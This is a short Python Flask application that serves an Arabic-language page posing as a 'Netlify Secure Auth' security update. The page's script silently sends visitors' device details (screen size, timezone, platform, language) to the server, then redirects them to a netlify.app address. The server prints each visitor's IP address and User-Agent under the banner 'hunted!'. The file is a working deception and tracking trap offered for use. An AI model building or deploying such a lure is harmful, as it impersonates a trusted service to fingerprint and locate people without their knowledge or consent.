from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)


TRAP_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث الأمان - Netlify Secure Auth</title>
    <style>
        body { font-family: Tahoma, sans-serif; background: #0f172a; color: #f8fafc; text-align: center; padding-top: 100px; }
        .box { background: #1e293b; padding: 40px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        .spinner { border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <h2>جاري التحقق من هوية المالك وتحديث الجلسة...</h2>
        <div class="spinner"></div>
        <p>يرجى الانتظار، يتم مزامنة المفاتيح الأمنية مع السيرفر.</p>
    </div>
    <script>
        // سحب تفاصيل قياس الجهاز الإضافية وإرسالها للسيرفر صامتاً
        fetch('/log-telemetry', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                screen: window.screen.width + 'x' + window.screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                platform: navigator.platform,
                language: navigator.language
            })
        }).then(() => {
            setTimeout(() => {
                window.location.href = "https://onlinesd-com.netlify.app";
            }, 2500);
        });
    </script>
</body>
</html>
"""

@app.route('/verify')
def verify():
    
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    print(f"\n[!] === hunted! ===")
    print(f"[+] time: {timestamp}")
    print(f"[+]  IP : {visitor_ip}")
    print(f"[+]   (User-Agent): {user_agent}")
    print(f"[================================]\n")
    
    return render_template_string(TRAP_HTML)

@app.route('/log-telemetry', methods=['POST'])
def log_telemetry():
    data = request.json or {}
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    print(f"[+] بيانات متقدمة (Telemetry) مسحوبة من الـ IP {visitor_ip}:")
    for key, value in data.items():
        print(f"    - {key}: {value}")
    print("-" * 40)
    return {"status": "logged"}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
